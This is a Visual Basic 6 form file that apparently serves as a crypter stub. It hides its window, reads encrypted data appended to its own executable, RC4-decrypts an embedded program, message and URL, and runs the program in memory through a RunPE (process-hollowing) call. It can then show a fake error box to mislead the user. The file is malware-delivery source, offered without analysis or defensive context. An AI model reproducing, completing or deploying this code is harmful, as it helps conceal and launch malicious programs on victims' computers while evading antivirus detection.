VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   2685
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   5640
   LinkTopic       =   "Form1"
   ScaleHeight     =   2685
   ScaleWidth      =   5640
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim rc4key      As String
Dim url         As String
Dim msg         As String
Dim injexe      As String
Dim fi()        As Byte
Dim del         As String
Private Sub Form_Load()
    On Error Resume Next
    Form1.Visible = False
    Form1.Width = 0
    Form1.Height = 0
    Dim exe     As String
    Dim c       As New Class1
    Dim l       As Long
    Dim f       As String
    Dim bf      As New Class2
    del = "llaopsoaku"

    exe = App.EXEName
    self = App.Path & "\" & exe & ".exe"
    l = FileLen(self)
    
    Open self For Binary As #1
    f = Space(l)
    Get #1, , f
    Close #1
    
    injexe = SplitAlter(f, del)(2)
    rc4key = SplitAlter(f, del)(3)
    msg = SplitAlter(f, del)(4)
    url = SplitAlter(f, del)(5)
    

    injexe = bf.crptstr(injexe, rc4key)
    fi = StrConv(injexe, vbFromUnicode)

    msg = bf.crptstr(msg, rc4key)

    url = bf.crptstr(url, rc4key)
    
    c.RunPE fi
    
    
    If msg <> "empty" Then MsgBox msg, vbCritical, "Error"
    Unload Me
    
End Sub
